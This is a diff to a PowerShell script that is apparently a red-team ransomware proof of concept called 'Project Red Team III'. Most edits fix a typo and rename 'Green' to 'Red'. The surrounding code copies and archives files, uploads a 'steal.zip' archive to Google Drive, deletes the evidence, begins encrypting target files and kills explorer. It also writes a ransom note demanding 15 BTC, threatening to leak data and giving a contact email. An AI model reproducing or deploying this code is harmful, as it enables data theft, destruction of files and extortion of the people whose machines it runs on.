@@ -60,7 +60,7 @@ Write-Host "[+] File c:\temp\backup.zip created..." -ForegroundColor Green
 # $Msg.Dispose()
 # $Mailer.Dispose()
 
-Write-Host "[+] Certificate password deliveGreen via email..." -ForegroundColor Green
+Write-Host "[+] Certificate password delivered via email..." -ForegroundColor Green
 # Start-Sleep -s 2
 Write-Host "[-] Deleting password file and archive..." -ForegroundColor Green
 Remove-Item c:\temp\sys.txt
@@ -97,7 +97,7 @@ Write-Host "[+] File C:\temp\backup1.zip created..." -ForegroundColor Green
 # $Msg.Dispose()
 # $Mailer.Dispose()
 
-Write-Host "[+] Certificate password deliveGreen via email..." -ForegroundColor Green
+Write-Host "[+] Certificate password delivered via email..." -ForegroundColor Green
 # Start-Sleep -s 2
 Write-Host "[-] Deleting password file and archive..." -ForegroundColor Green
 Remove-Item c:\temp\sys1.txt
@@ -112,8 +112,7 @@ $Destination = "c:\temp\w"
 If (Test-Path -Path $Destination -PathType Container)
 { Write-Host "$Destination already exists" -ForegroundColor Green}
 ELSE
-{ New-Item -Path $Destination -ItemType directory | Out-Null
-  Write-Host "Created $Destination" }
+{ New-Item -Path $Destination -ItemType directory | Out-Null }
 
 $cp = robocopy /E $Source $Destination
 
@@ -123,8 +122,7 @@ $Destination = "c:\temp\x"
 If (Test-Path -Path $Destination -PathType Container)
 { Write-Host "$Destination already exists" -ForegroundColor Green}
 ELSE
-{ New-Item -Path $Destination -ItemType directory | Out-Null
-  Write-Host "Created $Destination" }
+{ New-Item -Path $Destination -ItemType directory | Out-Null }
 
 $cp = robocopy /E $Source $Destination
 
@@ -134,8 +132,7 @@ $Destination = "c:\temp\y"
 If (Test-Path -Path $Destination -PathType Container)
 { Write-Host "$Destination already exists" -ForegroundColor Green}
 ELSE
-{ New-Item -Path $Destination -ItemType directory | Out-Null 
-  Write-Host "Created $Destination" }
+{ New-Item -Path $Destination -ItemType directory | Out-Null }
 
 $cp = robocopy /E $Source $Destination
 
@@ -144,8 +141,7 @@ $Destination = "c:\temp\z"
 If (Test-Path -Path $Destination -PathType Container)
 { Write-Host "$Destination already exists" -ForegroundColor Green}
 ELSE
-{ New-Item -Path $Destination -ItemType directory | Out-Null 
-  Write-Host "Created $Destination" }
+{ New-Item -Path $Destination -ItemType directory | Out-Null }
 
 $cp = robocopy /E $Source $Destination
 # Start-Sleep -s 5
@@ -235,7 +231,7 @@ $response = Invoke-RestMethod -Uri "https://www.googleapis.com/upload/drive/v3/f
 #$Source = "C:\temp"
 #$Destination = "C:\Users\$env:USERNAME\Desktop\StolenFiles"
 # Start-Sleep -s 10
-# Remove-Item c:\temp\steal.zip
+Remove-Item c:\temp\steal.zip
 # Start-Sleep -s 5
 Write-Host "[-] Archive deleted..." -ForegroundColor Green
 Write-Host "[+] Beginning target file encryption..." -ForegroundColor Green
@@ -343,7 +339,7 @@ $form.MaximizeBox = $false
 $Form.Back
 $Form.StartPosition = "CenterScreen" 
 $Form.FormBorderStyle = 'Fixed3D' 
-$Form.Text = "Project Green Team III" 
+$Form.Text = "Project Red Team III" 
 
 $img = [System.Drawing.Image]::Fromfile('c:\temp\img.png')
 $pictureBox = new-object Windows.Forms.PictureBox
@@ -434,7 +430,7 @@ Stop-Process -ProcessName explorer
 echo "We have encrypted your important files. For now, you cannot access these files. Encrypted files have been modified with an extension ""encrypted"". It is possible to recover your files but you need to follow our instructions and pay us before the time runs out. If you do not pay the ransom of 15 BTC these files will be leaked online. The faster you contact us at ecoterror443@gmail.com with the proof of payment, the easier it will be for us to release your files. Your backups were also encrypted and removed. Please read Phirautee.txt file on the desktop for further information. This ransomware encrypts all the files of the hard drive. To decrypt the files please send us the proof of the transfer. Do not try to modify the files extension or else it will destroy the data. If you do not pay the money your sensitive data will be leaked online." > c:/users/$env:USERNAME/desktop/ransom.txt
 #$Form.ShowDialog()
 #$Form.Focus()
-Get-ChildItem -Path Cert:\CurrentUser\My | where { $_.subject -eq "CN=Project Green Team III" } | Remove-Item
+Get-ChildItem -Path Cert:\CurrentUser\My | where { $_.subject -eq "CN=Project Red Team III" } | Remove-Item
 
 # Start-Sleep 2
 
